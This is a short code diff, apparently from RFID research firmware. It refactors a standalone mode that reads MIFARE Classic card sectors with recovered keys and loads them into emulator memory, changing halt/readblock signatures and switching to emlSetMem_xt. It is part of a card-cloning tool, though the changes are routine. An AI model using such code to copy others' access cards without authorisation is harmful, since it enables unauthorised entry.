@@ -109,7 +109,7 @@ static int saMifareCSetBlock(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_
                 break;
             };
 
-            if (mifare_classic_halt(NULL, mattyrun_cuid)) {
+            if (mifare_classic_halt(NULL)) {
                 DbprintfEx(FLAG_NEWLINE, "Halt error");
                 break;
             };
@@ -129,7 +129,7 @@ static int saMifareCSetBlock(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_
                 break;
             };
 
-            if (mifare_classic_halt(NULL, mattyrun_cuid)) {
+            if (mifare_classic_halt(NULL)) {
                 DbprintfEx(FLAG_NEWLINE, "Halt error");
                 break;
             };
@@ -165,7 +165,7 @@ static int saMifareCSetBlock(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_
         };
 
         if (workFlags & 0x04) {
-            if (mifare_classic_halt(NULL, mattyrun_cuid)) {
+            if (mifare_classic_halt(NULL)) {
                 DbprintfEx(FLAG_NEWLINE, "Halt error");
                 break;
             };
@@ -267,23 +267,23 @@ static int saMifareECardLoad(uint32_t numofsectors, uint8_t keytype) {
 
         // failure to read one block,  skips to next sector.
         for (uint8_t blockNo = 0; blockNo < NumBlocksPerSector(s); blockNo++) {
-            if (mifare_classic_readblock(pcs, mattyrun_cuid, FirstBlockOfSector(s) + blockNo, dataoutbuf)) {
+            if (mifare_classic_readblock(pcs, FirstBlockOfSector(s) + blockNo, dataoutbuf)) {
                 retval = PM3_ESOFT;
                 break;
             };
 
             if (blockNo < NumBlocksPerSector(s) - 1) {
-                emlSetMem(dataoutbuf, FirstBlockOfSector(s) + blockNo, 1);
+                emlSetMem_xt(dataoutbuf, FirstBlockOfSector(s) + blockNo, 1, 16);
             } else {
                 // sector trailer, keep the keys, set only the AC
                 emlGetMem(dataoutbuf2, FirstBlockOfSector(s) + blockNo, 1);
                 memcpy(&dataoutbuf2[6], &dataoutbuf[6], 4);
-                emlSetMem(dataoutbuf2, FirstBlockOfSector(s) + blockNo, 1);
+                emlSetMem_xt(dataoutbuf2, FirstBlockOfSector(s) + blockNo, 1, 16);
             }
         }
     }
 
-    int res = mifare_classic_halt(pcs, mattyrun_cuid);
+    int res = mifare_classic_halt(pcs);
     (void)res;
 
 out:
@@ -505,7 +505,7 @@ void RunMod(void) {
                         memcpy(mblock + t * 10, foundKey[t][sectorNo], 6);
                     }
                 }
-                emlSetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1);
+                emlSetMem_xt(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1, 16);
             }
         }
 
